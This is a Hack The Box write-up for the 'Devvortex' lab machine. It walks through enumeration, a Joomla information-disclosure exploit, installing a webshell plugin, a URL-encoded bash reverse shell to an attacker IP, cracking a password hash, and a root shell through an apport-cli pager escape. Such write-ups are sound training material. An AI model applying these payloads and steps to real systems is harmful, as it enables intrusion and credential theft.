---
date: 2024-04-19
title: Hack The Box — Devvortex
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - joomla
  - apport
  - linux
media_subpath: /assets/images
image: devvortex.png
---
# TL;DR

The HackTheBox machine "Devvortex" is an easy Linux box featuring a Joomla CMS vulnerable to CVE-2023-23752, an unauthenticated information disclosure flaw. Initial access is gained by enumerating virtual hosts to discover a development subdomain running Joomla, leaking database credentials via the vulnerability, and logging into the admin panel. Remote code execution (RCE) is achieved by uploading a malicious webshell plugin. Lateral movement to the 'logan' user uses a cracked password hash from the Joomla database. Finally, root access is obtained by exploiting CVE-2023-1326, a local privilege escalation vulnerability in apport-cli via sudo.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a basic Nmap scan was performed to identify open services, version information, and gather initial details about the target machine (IP: 10.10.11.242). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
sudo nmap -sC -sV -A 10.10.11.242 -oA nmap/initialscan
```

- `-sC`: Runs default scripts for additional information.
- `-sV`: Probes for service versions.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2025-10-06 10:00 UTC
Nmap scan report for 10.10.11.242
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:be:64:eb:7e:77:29:37:33:95:fd:1a:99:8a (ECDSA)
|_  256 db:b0:ee:28:43:2f:79:79:96:da:96:5c:1c:31:5a:50 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
```

**Notes:**

- **SSH (Port 22)**: Running OpenSSH 8.2p1 on Ubuntu, which suggests the OS is likely Ubuntu 20.04 (Focal Fossa), as this version aligns with that distribution. No immediate vulnerabilities were apparent without credentials.
- **HTTP (Port 80)**: Hosted by nginx 1.18.0 on Ubuntu, with a redirect to `http://devvortex.htb/`. This indicates a virtual host setup, common for web applications. No other services like HTTPS were open.
- The redirect implies the site is domain-specific, so the hostname `devvortex.htb` was added to `/etc/hosts` for local name resolution to enable proper access:
  ```bash
  echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
  ```
- No other ports were open, limiting initial attack surface to web and potential SSH later.

Additional scans like full port (`-p-`) or UDP could be run, but TCP 1-65535 confirmed only these two.

---

## Web Enumeration

### Main Page (devvortex.htb)

Navigating to `http://devvortex.htb/` (after hosts file update) revealed a static website for a fictional web development company, "DevVortex," with pages like index, about, portfolio, and contact. The site appears to be built with basic HTML/CSS/JS, and forms (e.g., newsletter signup) do not submit functional data. Directory enumeration was performed to uncover hidden paths.

The command used was Gobuster with a common wordlist:

```bash
gobuster dir -u http://devvortex.htb/ -w /usr/share/dirb/wordlists/common.txt
```

**Results:**

```
/css (Status: 301)
/images (Status: 301)
/js (Status: 301)
```

These directories contain static assets (stylesheets, images, scripts) but no sensitive information. A curl request confirmed the redirect behavior:

```bash
curl http://10.10.11.242/
```

This showed a 301 redirect to `http://devvortex.htb/`, reinforcing the need for the hosts file entry.

No immediate vulnerabilities were found on the main site, such as SQL injection in forms or exposed backups. The 404 page was the default nginx error page, indicating no custom error handling.

### Virtual Host Enumeration

Given the redirect and potential for subdomain-based virtual hosting, FFUF was used to fuzz for subdomains by modifying the Host header. First, a baseline size for invalid hosts was established:

```bash
curl -s -H "Host: nonexistantdomain.devvortex.htb" http://devvortex.htb | wc -c
```

This output a response size of 154 bytes (likely a default error page).

Then, the fuzzing command:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -fs 154
```

- `-w`: Wordlist for subdomain fuzzing.
- `-u`: Target URL.
- `-H`: Custom Host header with FUZZ placeholder.
- `-fs`: Filter out responses of size 154 (invalid hosts).

**Results:**

- `dev.devvortex.htb` (Status: 200, different size, indicating a valid virtual host).

Added to `/etc/hosts`:

```bash
echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

### Development Subdomain (dev.devvortex.htb)

Accessing `http://dev.devvortex.htb/` revealed a dynamic site loading `index.php`, suggesting a PHP-based CMS. A non-existent page (e.g., `/fake`) displayed a custom 404 error resembling Joomla's style. Further enumeration with Gobuster:

```bash
gobuster dir -u http://dev.devvortex.htb -w /usr/share/dirb/wordlists/big.txt
```

**Results:**

- `/administrator` (Status: 200)

Visiting `/administrator` showed a login page with "Powered by Joomla!" in the footer, confirming the CMS. This is a common admin interface for Joomla sites.

---

## Joomla Enumeration

### Version Detection

To identify the Joomla version, Metasploit's auxiliary module was used:

```bash
msfconsole
search exploit joomla
use auxiliary/scanner/http/joomla_version
set RHOSTS 10.10.11.242
set RPORT 80
set TARGETURI /administrator/
run
```

**Results:**

- Joomla version: 4.2.6

This version is vulnerable to CVE-2023-23752, an unauthenticated improper access control flaw allowing information disclosure via API endpoints.

### Vulnerability Research

Using Searchsploit:

```bash
searchsploit joomla 4.2
```

**Results:**

- `php/webapps/51334.py`: Joomla 4.2.0-4.2.7 - Unauthenticated Information Disclosure

This Python script exploits CVE-2023-23752 by accessing public API endpoints to leak sensitive data like database credentials and user lists.

---

## Initial Access (Web Exploitation)

### Information Disclosure Exploit

The exploit script (51334.py) was run after installing required Ruby gems (if missing):

```bash
ruby 51334.py http://dev.devvortex.htb
```

**Results:**

```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

This leaked MySQL credentials (`lewis:P4ntherg0t1n5r3c0n##`) and user details.

### Admin Panel Login

Using the leaked credentials, login to `http://dev.devvortex.htb/administrator/` was successful as user 'lewis' (Super User). The admin dashboard allows managing extensions, templates, and content.

### Remote Code Execution via Malicious Extension

A quick search for Joomla RCE methods revealed a GitHub repository for a webshell plugin: https://github.com/p0dalirius/Joomla-webshell-plugin.

- Cloned the repository and packaged it as a Joomla extension (ZIP).
- In the admin panel, navigated to System > Install > Extensions and uploaded the ZIP.
- Enabled the plugin under System > Plugins.

The webshell was accessible at `http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=id`, returning:

```json
{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"}
```

This confirmed command execution as www-data.

### Reverse Shell

Initial reverse shell attempts failed due to URL parsing issues. URL-encoding the payload succeeded:

```bash
http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.60%2F1234%200%3E%261%27
```

With a listener (`nc -lvnp 1234`), a shell as www-data was obtained. Upgraded for stability:

```bash
script /dev/null -c bash
```

---

## Lateral Movement & User Flag

As www-data, connected to the MySQL database using leaked credentials:

```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
show tables;
select name,username,password from sd4fg_users;
```

**Results:**

- logan paul | logan | logan@devvortex.htb | `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`

Identified the hash as bcrypt (Blowfish) using https://hashes.com/en/tools/hash_identifier.

Cracked with Hashcat:

```bash
hashcat -m 3200 -a 0 logan_hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

- Cracked password: `tequieromucho`

SSH as logan:

```bash
ssh logan@devvortex.htb
```

Retrieved user flag:

```bash
cat /home/logan/user.txt
1fb4026b5ac164cf34495e97e85682ae
```

---

## Privilege Escalation

### Enumeration

Checked sudo privileges:

```bash
sudo -l
```

- `(ALL : ALL) NOPASSWD: /usr/bin/apport-cli`

This allows running `apport-cli` as root without a password. Research revealed CVE-2023-1326, a local privilege escalation in apport-cli on Ubuntu.

Exploit PoC: https://github.com/diego-tella/CVE-2023-1326-PoC

### Exploitation

No crash files in `/var/crash/`. Created a new report:

```bash
sudo /usr/bin/apport-cli -f
```

- Selected option 1 (Report a bug in a package).
- Selected option 2 (Choose a package).
- Typed 'V' to view the report.
- In the pager, typed `!/bin/bash` to escape to a root shell.

Retrieved root flag:

```bash
cat /root/root.txt
e3afbbe5970bff2257b741f2d970eaa0
```

---

## Summary

|Step|Description|
|---|---|
|Enumeration|Nmap revealed SSH (22) and HTTP (80) on nginx with redirect to `devvortex.htb`. Added to /etc/hosts. Gobuster found static asset dirs.|
|Virtual Host Discovery|FFUF identified `dev.devvortex.htb` subdomain. Added to /etc/hosts. Gobuster found `/administrator` with Joomla login page.|
|Joomla Version & Vuln|Metasploit confirmed Joomla 4.2.6. Searchsploit found CVE-2023-23752 exploit for info disclosure.|
|Initial Access|Exploit leaked DB creds. Logged into admin panel as lewis. Uploaded malicious webshell plugin from GitHub for RCE as www-data. Obtained reverse shell via URL-encoded bash payload.|
|Lateral Movement|Dumped Joomla DB for logan hash. Cracked with Hashcat (password: tequieromucho). SSH as logan; grabbed user flag.|
|Privilege Escalation|Sudo on apport-cli vulnerable to CVE-2023-1326. Used PoC to escape pager to root shell via new bug report. Grabbed root flag.